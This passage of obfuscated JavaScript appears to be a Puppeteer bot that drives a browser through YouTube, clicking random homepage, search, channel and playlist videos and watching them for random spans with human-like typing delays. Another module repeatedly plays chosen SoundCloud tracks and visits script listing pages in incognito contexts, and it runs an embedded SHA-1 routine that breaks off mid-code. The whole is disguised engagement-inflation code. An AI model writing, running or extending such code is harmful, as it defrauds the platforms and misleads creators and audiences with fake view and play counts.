const X = c,
  W = d,
  V = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x3fd + -0x1 * 0x235d + 0x1 * 0x1f61))) + i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x13 * 0x51 + 0x56c * 0x2 + 0x5 * -0x35f);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xbdb * 0x3 + 0x3a9 * -0x5 + 0x1144 * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x13 * 0x51 + 0x56c * 0x2 + 0x5 * -0x35f);
    let h = e[f];
    if (c['uScHwd'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x3 * -0x303 + 0x1 * 0x20 + 0x8e9, r, s, t = -0x15d0 + -0xc2b * -0x2 + -0x286; s = m['charAt'](t++); ~s && (r = q % (0x2 * 0x1215 + -0x20 * 0x47 + 0x1b46 * -0x1) ? r * (0x140d * 0x1 + 0x1c8f + 0x1 * -0x305c) + s : s, q++ % (0x1437 + -0x27 * 0xf6 + 0x1147)) ? o += String['fromCharCode'](-0xd5d + -0x2315 + 0x3171 & r >> (-(0x9 * -0x97 + 0x79 * -0x4d + 0x29b6) * q & 0x1358 + 0x1868 + -0x2bba)) : 0xeb6 + -0x1 * -0x1655 + -0x3 * 0xc59) {
          s = n['indexOf'](s);
        }
        for (let u = -0x183b * -0x1 + -0xe * 0x2a7 + 0xce7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x2099 + 0x8 * 0x2f9 + 0x455 * -0xd))['slice'](-(0x11 * -0x3e + 0x9d4 + 0x2 * -0x2da));
        }
        return decodeURIComponent(p);
      };
      c['jSHcTa'] = i, b = arguments, c['uScHwd'] = !![];
    }
    const j = e[0x1 * -0x17be + -0xd70 + 0x252e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['jSHcTa'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xcf * -0x51 + 0x88ac + 0x2e03 + (0x2a1e + -0x2815 + 0x388f) * random()) : await standardWaitForNetIdle(f), await wait(-0x1100 + -0x1b5d + 0x3fe5 + (0x2033 * 0x2 + 0x2336 + 0xfa * -0x3e) * random()), -0xefe + 0x89f * -0x4 + 0x317b;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * -0xec + -0xcd1 * 0x1 + -0x649 * -0x5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x263a + 0x38b * -0x3 + -0x1b98;
}
async function randomWait() {
  return await wait(0x6b * 0x9 + 0x1344 + 0xb3 * -0x5 + (0x1 * 0xe93 + -0x19cb + 0x1ec0) * random()), 0x1e92 + 0x224 + -0x20b5;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x47 * -0x7f + -0x1a33 + -0x906, 0x7 * -0x17b + 0x86 * -0x24 + -0x1 * -0x1d3c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x71ea * -0x3 + 0x1030f + -0x1 * -0x13d0f) * getRandomInt(-0x311 * 0x2 + -0x1 * -0x1024 + -0x50 * 0x20, -0x1f13 * -0x1 + 0x242 + 0x52 * -0x68), h)), 0x1 * -0x1d2a + -0x4cc * -0x2 + 0x1393 * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * 0x19ee + 0xd7d + 0xc71;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x70c * -0x4 + 0x8eb + 0x1346]['split']('\x20');
    for (let k = 0xb8c + 0x23ef + 0x451 * -0xb; k < i['length']; k += -0xe5d + 0x5 * 0x2e6 + -0x1f)
      j += i[k] * h[i[k + (0x187 * 0x11 + -0x5 * -0x20c + -0x2432)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + R(0x14, '08m2')), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x93 + 0x143b + 0x98 * -0x23)['map'](l => Array['from'](l['children']))['flat'](-0x7 * -0x1cd + -0x347 + -0x953)['map'](l => l['childNodes'][0xdc2 + 0xe27 + -0x1be8 * 0x1]['childNodes'][-0x5 * 0x2eb + 0x2577 * -0x1 + 0x8ad * 0x6]['childNodes'][-0x7 * -0x120 + 0x2f4 * 0x3 + 0x10bb * -0x1]['childNodes'][-0x664 + -0xdb2 + 0x1416]['childNodes'][0xe90 + 0x7 * 0xc1 + -0x13d6]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x18fb + 0x57d * 0x5 + 0x25 * 0xa, -0xa9b + 0x66f + 0x17b4)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x235c + 0x1487 * 0x3 + 0x1 * -0x2659);
  const h = await getMaxTime(f),
    i = Math['min']((-0x9205 + 0x94a + -0x1731b * -0x1) * getRandomInt(0x1101 + -0x1e88 + 0xd89, 0xcba + 0x1124 + 0x1b * -0x11b), h);
  return await wait(i), -0x1 * 0x2301 + -0xd * -0x2e3 + -0x285;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1218 + -0x1ebf + -0x1 * -0xca7]['children'][0xfe3 + -0x139 * -0x1d + 0xd4 * -0x3e]['children'][-0x1be8 + 0x1e33 + -0x1 * 0x24b]['children'][0x1 * -0x1529 + 0x7c1 + -0x68 * -0x21]['children'][0xb * -0x1a3 + 0x1 * -0x3fd + 0xaff * 0x2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x211a + 0xba0 * 0x3 + -0x3 * 0x97;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x22c3 + -0x94b + -0x14 * 0x141 + (-0x10aa + 0x1 * -0xe17 + 0x1ef3) * random()
  }), await wait(-0x2a7 * 0x1 + -0x353 + -0xa * -0xcb + (0x256f * -0x1 + -0x263d + -0x99b * -0x8) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const S = b;
    if (!await f['evaluate'](() => Array['from'](document[S(0x18, '2Th*') + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1e06 + 0x2210 + 0x4 * -0x1005]['childNodes'][0x5b3 * -0x4 + 0x2 * -0x1115 + -0x12fd * -0x3]['childNodes'][0x1f02 + -0x23bf + 0x25f * 0x2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x2033 + 0x555 + 0x1ae3]['childNodes'][-0x1 * 0x893 + 0xb68 * 0x1 + -0x2d5 * 0x1]['childNodes'][-0x1cd9 + -0x2 * 0x92b + -0x1 * -0x2f31]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1e22 + -0x69d + -0x2 * 0xbc2),
          r = 0xdcf + 0x1c10 + -0x1b * 0x18d;
        for (let u = 0xa7 * -0x2f + -0xf81 + -0x26 * -0x137; u < q['length']; u += 0x38 * 0xac + 0x5 * 0x680 + -0x461e)
          r += q[u] * k[q[u + (0x599 + -0x6 * -0x248 + 0x1348 * -0x1)]];
        return r;
      }(n);
  });
  await wait((0x1 * -0x6bf9 + -0x5ff4 + -0x3481 * -0x5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1 * -0xa5e + -0x64ca + -0x2a4 * -0x7b) * getRandomInt(-0x3d * -0x13 + 0x1 * 0x1283 + -0x1709, 0x2288 + -0x2185 * -0x1 + -0x4403), h + (-0xe55 + 0xe4c + -0x1391 * -0x1));
  return await wait(i), 0x2375 + -0x1e85 + -0x1a5 * 0x3;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1f96 + 0x25ce + -0x638), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd * 0x21a + 0x266b + 0x9f + (-0x152b * 0x1 + -0x2 * -0x243 + 0x148d * 0x1) * Math['random']());
    });
  }, -0x2be2 + -0x17 * -0x139 + 0x2b1b);
  await wait(-0x1 * 0x2d38f + 0x72617 + -0x11 * -0x3d8);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2 * 0x4d31 + -0x29a * 0xa8 + 0x339d2) * getRandomInt(-0x148f * -0x1 + 0x148 * -0xe + 0x17 * -0x1d, -0x1fcc + -0x1e50 + -0x7 * -0x8e3)), clearInterval(h), -0x2467 + 0x2 * -0xe33 + -0x1e * -0x229;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x4 * -0x7ff + 0x18 * 0x65 + -0x2974 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xd86 * -0x2 + 0xb3 * 0xb + 0x19d * 0xc;
    await randomWait();
  }
  return 0x46e + 0x21b5 * 0x1 + -0x2622;
}

function fetchRandomSC() {
  const T = c;
  return Math['random']() <= 0x2466 + 0x2 * 0xf9e + -0x21d1 * 0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3ef + -0x3 * -0x8e1 + 0x4 * -0x5ad + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + T(0x6) + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1f84 + -0x214d + 0x40d1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1b * -0xa3 + 0x23c1 + -0x11a6 * 0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xbefe + 0x1 * -0x8bbd + -0x1c1 * -0x47 + getRandomInt(-0x2b9a + -0xb * 0x49 + 0x1 * 0x6955, -0x37c * 0xb + 0x1 * 0x75e9 + -0x1 * -0x259b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x17dc + -0xa3e + 0x221b), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x9ed + -0x739 * 0x4 + 0x26d1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x9 * 0x377 + 0x1 * -0xb0c + 0x2a3b, 0x5 * 0x241 + -0x25 * 0xbf + 0x1088)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x19c + -0x1b7b + 0x8d * 0x43 + floor((-0x1404 + 0x2077 * 0x1 + -0x88b) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xd5c4228e + -0x2c6d * -0x2f1b0 + -0x138b * -0xacb9a),
          0x3 * -0x527bdd + -0x9ae599 + 0x1092c98 * 0x2,
          -0x2b22 * -0x5 + 0xad08 + -0x104b2,
          0x99 * -0x2b + -0x19b * -0x13 + 0x227 * -0x2
        ], y = [
          0x20f0 + 0x1 * -0x2075 + -0x63,
          0x1ae5 + 0x59 * 0x61 + 0x1 * -0x3c8e,
          -0x12d4 + 0x152a + -0x24e,
          -0xa7 * -0x32 + 0x2485 + 0x4523 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x110e + -0x1aae + 0x9a1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x39d + 0x1b33 + 0x4 * -0x7b4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x9 * 0x37e + 0x3 * -0x42a + 0x1 * 0x2bec) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xcb8 + 0x1 * -0x19ed + 0x26a5] = A[0x15d4 * -0x1 + -0x208d + -0x4f3 * -0xb] = A[0x183a + -0x1919 + 0x2 * 0x70] = A[0x1d7f + -0x12 * -0x94 + -0x5b3 * 0x7] = A[-0xbe8 + -0x767 + -0x2 * -0x9a9] = A[0x1f * -0x10f + 0x33d + 0x1d98] = A[-0x21c2 + 0x1aba + 0x1 * 0x70d] = A[-0x672 + -0x1d1f * 0x1 + 0x2397] = A[-0x2281 + -0x1e21 + 0x40a9] = A[0x700 + -0x1bce + 0x14d6] = A[-0xd38 + 0xa7 * -0x26 + 0x260b] = A[-0x166a + -0xbbb + 0x222f] = A[0x1 * 0x44b + 0x2 * -0x4bc + 0x538] = A[-0x18be + -0x1a48 + 0x1989 * 0x2] = A[-0x1db6 + 0xc15 * 0x1 + 0x11ae] = A[-0x1 * -0x2003 + -0xaf1 * -0x2 + -0x35d7] = A[-0x2087 + 0x1 * 0x2671 + -0x1 * 0x5db] = -0x1c54 + 0x2168 + 0x4 * -0x145, this['blocks'] = A) : this['blocks'] = [
                0x1b31 * 0x1 + 0xbb7 + -0x26e8,
                0x23f7 + -0x1215 + 0x3 * -0x5f6,
                0x1ac * -0x11 + -0x47f + 0x20eb,
                -0x1 * 0x14dd + -0xb4d + -0x1015 * -0x2,
                0x227e + -0x1906 + -0x978,
                0x2c4 + 0xc2a + -0x222 * 0x7,
                -0x12 * 0x77 + -0x41c * 0x5 + 0x1cea,
                0xa * -0x15b + 0x28 * -0x9b + 0x25c6,
                -0x8 * 0x2f8 + -0xc2d + -0x23ed * -0x1,
                -0x150d + -0x5bc + 0x1 * 0x1ac9,
                0xb3 * -0x31 + 0x1990 + -0x11 * -0x83,
                -0x35 * 0xa1 + 0x1d25 + -0x2 * -0x218,
                -0xbbc + 0x52 * -0x7 + 0xdfa,
                -0x21bc + -0x676 * -0x3 + 0xe5a,
                -0x16f + 0x49 * -0x50 + -0x815 * -0x3,
                0x1079 * 0x2 + -0x85b * 0x1 + -0x1 * 0x1897,
                0xc6a + -0x1 * 0x2a5 + -0x9c5
              ], this['h0'] = 0x4c1c6c26 + 0x403bd * -0x9f + 0x1da7093e, this['h1'] = 0x17c07a91 * -0x11 + 0x14107e55f * -0x1 + 0x3c49db489, this['h2'] = -0x78 * 0x1fd1863 + -0xf526af5f + 0x27c84fac5, this['h3'] = -0xc930fd3 + -0x109e4955 + 0x2d63ad9e, this['h4'] = -0x1 * -0xe957d113 + 0x619 * 0x951d5 + 0x1a1a * -0x39d58, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x4e8 * 0x4 + -0x3a9 + -0x1 * 0xff7, this['finalized'] = this['hashed'] = 0xf28 + 0xe6f * -0x2 + 0xdb6, this['first'] = -0x5ab + -0x6 * -0x21 + 0xb * 0x72;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x752 + -0x153 * 0x1 + 0x8a5 * 0x1, O = J['length'] || 0x5f * 0x65 + -0x2 * -0x124 + -0x27c3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x3b3 + 0x1cfe + 0x1 * -0x20b1, P[-0x1 * -0x2e9 + 0x58e * 0x3 + -0x1393 * 0x1] = this['block'], P[-0x22c * 0xb + -0x19b1 * -0x1 + -0x1bd] = P[-0x1818 + -0x726 + 0x1f3f] = P[-0xf15 + 0x1fb5 * 0x1 + -0x109e] = P[0xf7 * 0x1 + 0x1183 * 0x1 + -0x1277] = P[0x1 * -0x1d9b + -0x1 * 0x2276 + 0x3c5 * 0x11] = P[0x2636 + 0x1db + 0x280c * -0x1] = P[0x83 * -0x7 + 0x2570 + -0x21d5] = P[-0x991 + -0x2a6 + -0x61f * -0x2] = P[0x247 * -0x7 + -0x45c + 0x1455] = P[0x1d + 0x1285 + 0x45 * -0x45] = P[-0x135f + 0x7b8 + -0x49 * -0x29] = P[-0x19 * 0xc3 + 0xb * -0x2c5 + 0x318d] = P[0x511 + -0x33 * 0x15 + 0xd6 * -0x1] = P[-0x263b * -0x1 + -0x15be + 0x2 * -0x838] = P[0x201d + 0x1 * 0x220e + -0x421d] = P[0x1909 + 0xe90 + -0x278a] = 0x3b * 0x8f + 0x1 * 0x160b + -0x3700), K) {
                    for (N = this['start']; M < O && N < 0x10d1 + 0x1 * 0x2275 + -0x881 * 0x6; ++M)
                      P[N >> 0x1854 + -0xc * 0x175 + -0x6d6] |= J[M] << y[-0x1 * 0x1d23 + 0xcc + 0x1c5a * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1 * 0x437 + -0x1 * -0x2b6 + 0x1c1; ++M)
                      (L = J['charCodeAt'](M)) < 0x1168 + -0x2545 + 0xd * 0x191 ? P[N >> -0x539 + 0xde0 + -0x8a5 * 0x1] |= L << y[0xe26 + 0x756 + -0x1 * 0x1579 & N++] : L < -0x13 * -0x147 + 0x895 * 0x3 + -0x1 * 0x2a04 ? (P[N >> -0x1 * -0xf86 + 0x1 * 0x1be3 + -0x2b67] |= (-0x1 * -0xfe5 + -0xe65 + -0xc0 | L >> 0x5b2 + 0x2394 + -0x2940) << y[-0x139 * 0x15 + 0x251c + -0xb6c & N++], P[N >> -0x2f * -0xc7 + -0x1c81 + 0x403 * -0x2] |= (0x1c4f + 0x200a + -0x3bd9 | -0x18c4 + -0x18a + 0x1a8d & L) << y[0x1822 + -0xcd5 + -0xb4a & N++]) : L < 0x618e + -0xca6 * 0xb + 0x1577 * 0xc || L >= 0x51a * 0x1f + -0x3dfb + 0x7fd5 ? (P[N >> -0x10ad + -0x57d + 0x162c] |= (0x210c + -0xe3 * 0x11 + -0x3 * 0x5b3 | L >> 0x22e8 + 0x5fc + -0x146c * 0x2) << y[-0xc6d + -0x218a + -0x16 * -0x217 & N++], P[N >> 0x1586 + -0x1bb0 + 0x62c] |= (-0x1997 * 0x1 + 0x1073 * -0x1 + 0x2a8a | L >> 0x1 * -0x1784 + -0xa10 + 0x219a & -0x66b + -0x2b3 * -0x1 + -0x23 * -0x1d) << y[0x1845 + -0x1eab + 0x669 & N++], P[N >> -0x1 * 0x463 + 0x13 * -0x19d + 0x230c] |= (0x5c8 * 0x3 + -0x41a + -0xcbe | 0x20c9 + 0x6a * -0xa + -0x1c66 & L) << y[-0x241e + -0x1 * 0x1e49 + -0x426a * -0x1 & N++]) : (L = 0xcea + 0x2093 * 0x1 + -0xd283 * -0x1 + ((-0xb57 + 0x7f * 0x34 + -0xa76 & L) << 0x1 * 0x1402 + -0x550 + -0x8 * 0x1d5 | 0xc77 + -0xb8 * 0x18 + 0x8c8 & J['charCodeAt'](++M)), P[N >> 0xc94 + 0xa * -0x168 + 0x17e] |= (0x1ac * 0x2 + -0x1e1b + 0x1bb3 | L >> 0x2 * 0x135e + -0x481 + -0x2229) << y[0x11cf * -0x1 + -0x8d * 0x21 + -0x61 * -0x5f & N++], P[N >> 0x1 * -0x853 + -0x3 * 0x1c9 + 0xdb0 * 0x1] |= (-0x2116 + 0x1 * 0x1407 + 0xd8f | L >> -0x5 * 0x101 + -0x1c6c + 0x217d & 0x45d + -0xf03 + -0xae5 * -0x1) << y[-0x10d * 0x5 + 0x264e + 0x2 * -0x1085 & N++], P[N >> -0x2295 * -0x1 + 0xad7 * 0x2 + -0x3841] |= (-0x5 * -0x295 + -0x256e + 0x393 * 0x7 | L >> -0xe72 * 0x2 + 0x1e16 + -0x12c & -0x24c2 + 0x63 * 0x5d + 0x10a) << y[-0xb9 * -0xf + 0x1a3b + 0x1 * -0x250f & N++], P[N >> 0x1af7 + 0x1c53 + -0x3748] |= (0x75b + -0x7c * -0x8 + -0xabb | -0x2 * -0x83 + 0x1 * -0x1193 + -0xd7 * -0x14 & L) << y[0x2 * 0x362 + -0x1 * 0x155b + -0x6 * -0x26f & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1ed4 * 0x1 + -0x2025 + 0x191 ? (this['block'] = P[0x24e9 + 0xb9f + -0x3078], this['start'] = N - (-0xaf7 * 0x1 + 0x1a6 * 0x14 + -0x15c1), this['hash'](), this['hashed'] = -0x9 * -0x17 + 0x3e5 * 0x9 + 0x1 * -0x23db) : this['start'] = N;
                }
                return this['bytes'] > -0x1ff7a015f + 0x18907dc87 + 0x1767224d7 && (this['hBytes'] += this['bytes'] / (-0x1e8275fdc + 0x845e * -0x12d0c + 0x383d01a44) << 0x138e + -0x1ddb + 0xa4d, this['bytes'] = this['bytes'] % (0x4d7025c * -0x5 + -0x4 * 0x1681e7bf + -0x9f8a * -0x25214)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x9b1 + -0x1b58 + 0x8 * 0x235;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x5 * 0x15a + 0x59 * -0x17 + 0xed1 * 0x1] = this['block'], J[K >> -0x13 * 0x1 + -0x1 * -0x1b2f + -0x1b1a] |= x[0x5ad * 0x1 + -0x26b8 + -0x2 * -0x1087 & K], this['block'] = J[-0x2e5 + 0x141a + -0x273 * 0x7], K >= 0x240d + 0x1ec4 + -0x4299 && (this['hashed'] || this['hash'](), J[0x1 * -0xdeb + 0x1caa + 0xebf * -0x1] = this['block'], J[-0x2ab * -0xb + 0x1d * 0x6f + -0x26 * 0x11a] = J[0x3 * -0xadb + -0x24d + 0x22df] = J[0x2e7 * 0xd + -0x69e + -0x1f1b] = J[0x1 * -0x36c + 0x1 * -0x24d + 0x5bc] = J[-0x266b + 0x1434 + -0x123b * -0x1] = J[0x16b5 * -0x1 + -0x4c0 + 0x2 * 0xdbd] = J[0x22d * 0xd + 0x261c + -0x1 * 0x425f] = J[0x10fe + 0x19f1 + -0x2ae8] = J[-0xd16 + -0x1 * 0xe0 + 0xdfe] = J[0x1551 + 0x13d * 0xc + 0x303 * -0xc] = J[-0x1 * 0xf8f + 0x1 * -0xff6 + 0x1f8f] = J[-0x2587 + -0x18b * -0x8 + 0x193a] = J[-0x1693 * 0x1 + 0x1 * 0x7ed + 0xeb2] = J[-0x21de + -0x1f0 + 0x23db] = J[0x11 * -0x45 + -0x2 * -0x1136 + 0x5f5 * -0x5] = J[0x1f42 * 0x1 + -0x1 * -0x1494 + -0x33c7] = 0x8 * 0x38a + -0x25cb + 0x97b * 0x1), J[0x31a * -0x8 + 0x1 * -0xd24 + 0x2602] = this['hBytes'] << 0x3 * 0x2fd + 0x1eb + -0xadf | this['bytes'] >>> -0x6d * -0x40 + 0x3 * -0x9c3 + 0x226, J[-0x21 * 0x11b + -0x20c * 0x5 + -0x2 * -0x1763] = this['bytes'] << 0x2261 + 0x1 * 0x4eb + -0x71 * 0x59, this['hash']();
              }
            }
            ['hash']() {
